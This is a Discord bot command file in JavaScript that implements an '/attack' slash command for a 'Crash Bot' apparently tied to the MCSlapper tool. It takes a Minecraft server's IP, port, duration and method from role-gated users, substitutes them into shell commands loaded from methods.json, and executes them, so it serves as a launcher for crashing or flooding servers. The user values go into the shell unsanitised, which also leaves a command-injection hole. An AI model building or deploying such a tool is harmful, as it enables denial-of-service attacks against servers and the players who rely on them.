const { SlashCommandBuilder, EmbedBuilder } = require('discord.js');
const { exec } = require('child_process');
const util = require('util');
const fs = require('fs').promises;
const execPromise = util.promisify(exec);
const allowedChannelIds = [
    '1375184027249545388',
    '1375102048026230966',
    '1375103102126129223',
    'Channe_ID'
];
const allowedRoleIds = [
    '1375187025375920229',
    '1375103102126129223',
    '1375102048026230966',
    'ID_ROLE'
];
module.exports = {
    data: new SlashCommandBuilder()
        .setName('attack')
        .setDescription('Attacks a Minecraft server')
        .addStringOption(option =>
            option.setName('ip')
                .setDescription('Server IP')
                .setRequired(true))
        .addIntegerOption(option =>
            option.setName('port')
                .setDescription('Server Port')
                .setRequired(true))
        .addIntegerOption(option =>
            option.setName('time')
                .setDescription('Duration in seconds')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('method')
                .setDescription('Attack method')
                .setRequired(true)),
    async execute(interaction) {
        if (!allowedChannelIds.includes(interaction.channelId)) {
            return interaction.reply({ content: 'This command can only be used in specific channels.', ephemeral: false });
        }
        if (!interaction.member.roles.cache.some(role => allowedRoleIds.includes(role.id))) {
            return interaction.reply({ content: 'You don’t have permission to send attack', ephemeral: false });
        }
        const ip = interaction.options.getString('ip');
        const port = interaction.options.getInteger('port');
        const time = interaction.options.getInteger('time');
        const method = interaction.options.getString('method');
        if (!ip) {
            const embed = new EmbedBuilder()
                .setColor('#FF0000')
                .setDescription('Please provide a valid IP')
                .setTimestamp();
            return interaction.reply({ embeds: [embed], ephemeral: false });
        }
        if (!port) {
            const embed = new EmbedBuilder()
                .setColor('#FF0000')
                .setDescription('Please provide a valid port')
                .setTimestamp();
            return interaction.reply({ embeds: [embed], ephemeral: false });
        }
        if (!time) {
            const embed = new EmbedBuilder()
                .setColor('#FF0000')
                .setDescription('Please provide a valid time')
                .setTimestamp();
            return interaction.reply({ embeds: [embed], ephemeral: false });
        }
        let methods;
        try {
            const data = await fs.readFile('./methods.json', 'utf8');
            methods = JSON.parse(data);
        } catch (error) {
            console.error(error);
            const embed = new EmbedBuilder()
                .setColor('#FF0000')
                .setDescription('Error loading methods, check methods.json')
                .setTimestamp();
            return interaction.reply({ embeds: [embed], ephemeral: false });
        }
        if (!methods || !Object.keys(methods).length) {
            const embed = new EmbedBuilder()
                .setColor('#FF0000')
                .setDescription('No methods available in methods.json')
                .setTimestamp();
            return interaction.reply({ embeds: [embed], ephemeral: false });
        }
        if (!methods[method]) {
            const methodList = Object.keys(methods).map(m => `**${m}**`).join('\n');
            const embed = new EmbedBuilder()
                .setColor('#FF4500')
                .setTitle('Available Attack Methods')
                .setDescription(`The method **${method}** is invalid. Please choose one of the following:\n\n${methodList}`)
                .setThumbnail('https://j.top4top.io/p_3309604rd1.png')
                .setTimestamp()
                .setFooter({ text: 'Crash Bot | Powered by MCSlapper', iconURL: 'https://j.top4top.io/p_3309604rd1.png' });
            return interaction.reply({ embeds: [embed], ephemeral: false });
        }
        await interaction.deferReply();
        await interaction.editReply({ content: 'Loading attack...' });
        await new Promise(resolve => setTimeout(resolve, 3000));
        const successEmbed = new EmbedBuilder()
            .setColor('#FF4500')
            .setTitle('Successfully Server Attack')
            .setThumbnail('attachment://mcslapper.png')
            .addFields(
                { name: 'Target IP:', value: ip, inline: true },
                { name: 'Port:', value: `${port}`, inline: true },
                { name: 'Method:', value: method, inline: true },
                { name: 'Duration:', value: `${time} seconds`, inline: true }
            )
            .setImage(`http://status.mclive.eu/Crash-Bot/${ip}/${port}/banner.png`)
            .setFooter({ text: 'Crash Bot | Powered by MCSlapper', iconURL: 'https://j.top4top.io/p_3309604rd1.png' });
        await interaction.editReply({ embeds: [successEmbed], files: ['./icon/mcslapper.png'], components: [] });
        try {
            let command = methods[method];
            command = command.replace('${ip}', ip).replace('${port}', port).replace('${time}', time);
            await execPromise(command);
        } catch (error) {
            console.error(error);
            const errorEmbed = new EmbedBuilder()
                .setColor('#FF0000')
                .setTitle('Attack Failed')
                .setDescription('Can’t reach server!')
                .setTimestamp()
                .setFooter({ text: 'Discord.nortoncraft.club' });
            await interaction.followUp({ embeds: [errorEmbed], ephemeral: false });
        }
    }
};